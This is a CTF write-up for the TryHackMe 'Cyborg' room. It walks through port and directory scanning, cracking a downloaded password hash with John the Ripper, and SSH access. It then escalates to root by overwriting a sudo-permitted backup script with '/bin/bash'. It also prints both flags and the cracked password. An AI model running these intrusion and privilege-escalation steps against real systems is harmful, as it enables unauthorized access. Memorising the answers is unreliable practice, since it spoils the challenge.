# TryHackMe - Cyborg

## Challenge Description
- **Difficulty:** Easy
- **OS:** Linux
- **Link:** https://tryhackme.com/room/cyborgt8

## Overview
This challenge involves compromising a Linux machine running SSH and HTTP services. The exploitation path includes discovering hidden directories, extracting Borg backup archives, cracking password hashes, and privilege escalation via sudo misconfiguration.

---

## Task 1: Deploy the Machine
Deploy the target machine and establish connectivity.

✅ **Status:** Complete

---

## Task 2: Compromise the System 

### Initial Reconnaissance

#### Nmap Scan
```bash
nmap -sC -sV 10.49.144.69
Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-30 09:38 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.49.144.69
Host is up (0.00012s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key Findings:**
- Port 22: SSH (OpenSSH 7.2p2)
- Port 80: HTTP (Apache 2.4.18)

#### Questions & Answers

**Q1: Scan the machine, how many ports are open?**  
**Answer:** `2`

**Q2: What service is running on port 22?**  
**Answer:** `ssh`

**Q3: What service is running on port 80?**  
**Answer:** `http`

```

#### Gobuster Scan
```bash
gobuster dir -u http://10.49.144.69 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


## gobuster
 /admin contains the downloadable acrhive file
 /etc directory has hashed password
root@ip-10-49-74-184:~# gobuster dir -u http://10.49.144.69 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.144.69
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 312] [--> http://10.49.144.69/admin/]
/etc                  (Status: 301) [Size: 310] [--> http://10.49.144.69/etc/]
/server-status        (Status: 403) [Size: 277]
Progress: 218275 / 218276 (100.00%)
===============================================================
Finished
===============================================================
root@ip-10-49-74-184:~# 

```

**Interesting Directories:**
- `/admin` - Contains downloadable archive file
- `/etc` - Contains hashed password

---

### Extracting Borg Backup Archive

#### Download and Extract Archive
```bash
hive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1
root@ip-10-49-74-184:~# ls
archive.tar  burp.json  CTFBuilder  Desktop  Downloads  home  Instructions  note_to_jake.txt  Pictures  Postman  Rooms  Scripts  snap  thinclient_drives  Tools
root@ip-10-49-74-184:~# cd archive.tar 
bash: cd: archive.tar: Not a directory
root@ip-10-49-74-184:~# cat /home/field/dev/final_archive/README
cat: /home/field/dev/final_archive/README: No such file or directory
root@ip-10-49-74-184:~# cd home
root@ip-10-49-74-184:~/home# ls
field
root@ip-10-49-74-184:~/home# cd field/
root@ip-10-49-74-184:~/home/field# ls
dev
root@ip-10-49-74-184:~/home/field# cd dev/
root@ip-10-49-74-184:~/home/field/dev# ls
final_archive
root@ip-10-49-74-184:~/home/field/dev# 
root@ip-10-49-74-184:~/home/field/dev# cd final_archive/
root@ip-10-49-74-184:~/home/field/dev/final_archive# ls
config  data  hints.5  index.5  integrity.5  nonce  README
root@ip-10-49-74-184:~/home/field/dev/final_archive# cat README
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/

## Challenge 4: What is the user.txt flag?
Ans: flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}

# Approach
-> Copy the password from the /etc page and usr john to decrypt it
root@ip-10-49-74-184:~# john abc.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-opencl"
Use the "--format=md5crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward        (?)
1g 0:00:00:01 DONE (2026-01-30 10:05) 0.9523g/s 37120p/s 37120c/s 37120C/s 112704..salsabila
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
root@ip-10-49-74-184:~# borg list home/field/dev/final_archive
Enter passphrase for key /root/home/field/dev/final_archive: 
music_archive                        Tue, 2020-12-29 14:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]

Extract the music archive and navigate into alex directory and then after a lil bit of finding /documents and there u will get the user flag

## Challenge 5: What is the root.txt flag?
Ans: flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}

# Approach
-> After getting the password ssh as alex and start exploting the system and we found that alex can run backup.sh file without password, so escalate the privilage by "/bin/bash" into backup.sh and sudo it.
root@ip-10-49-74-184:~# ssh alex@10.49.144.69
The authenticity of host '10.49.144.69 (10.49.144.69)' can't be established.
ECDSA key fingerprint is SHA256:uB5ulnLcQitH1NC30YfXJUbdLjQLRvGhDRUgCSAD7F8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.144.69' (ECDSA) to the list of known hosts.
alex@10.49.144.69's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


27 packages can be updated.
0 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

alex@ubuntu:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
alex@ubuntu:~$ cat user.txt 
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
alex@ubuntu:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
alex@ubuntu:~$ chmod 777 /etc/mp3backups/backup.sh
alex@ubuntu:~$ echo "/bin/bash" > /etc/mp3backups/backup.sh 
alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh 
root@ubuntu:~# whoami
root
root@ubuntu:~# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
root@ubuntu:~# cd /root
root@ubuntu:/root# ls
root.txt
root@ubuntu:/root# cat root.txt 
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
